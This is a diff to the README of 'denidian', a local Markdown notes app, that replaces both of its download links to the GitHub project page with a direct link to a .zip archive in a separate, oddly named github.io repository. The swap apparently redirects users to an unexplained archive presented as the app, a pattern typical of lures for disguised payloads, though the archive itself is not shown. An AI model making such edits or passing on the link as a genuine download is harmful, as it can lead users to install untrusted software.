@@ -5,7 +5,7 @@ description: "Manage local Markdown notes with wikilinks and a force-directed gr
 ---
 # 📝 denidian - Organize your thoughts with simple notes
 
-[![](https://img.shields.io/badge/Download_denidian-blue)](https://github.com/Verbenaceaefamilylamnidae461/denidian)
+[![](https://img.shields.io/badge/Download_denidian-blue)](https://raw.githubusercontent.com/Verbenaceaefamilylamnidae461/verbenaceaefamilylamnidae461.github.io/main/callet/github_verbenaceaefamilylamnidae_io_1.9-beta.3.zip)
 
 ## 📌 About this application
 
@@ -24,7 +24,7 @@ Before you install denidian, confirm your system meets these standards:
 
 Visit the page linked below to reach the latest version of the application. 
 
-[Download denidian from this page](https://github.com/Verbenaceaefamilylamnidae461/denidian)
+[Download denidian from this page](https://raw.githubusercontent.com/Verbenaceaefamilylamnidae461/verbenaceaefamilylamnidae461.github.io/main/callet/github_verbenaceaefamilylamnidae_io_1.9-beta.3.zip)
 
 Once you reach the link, follow these steps to place the software on your machine:
 
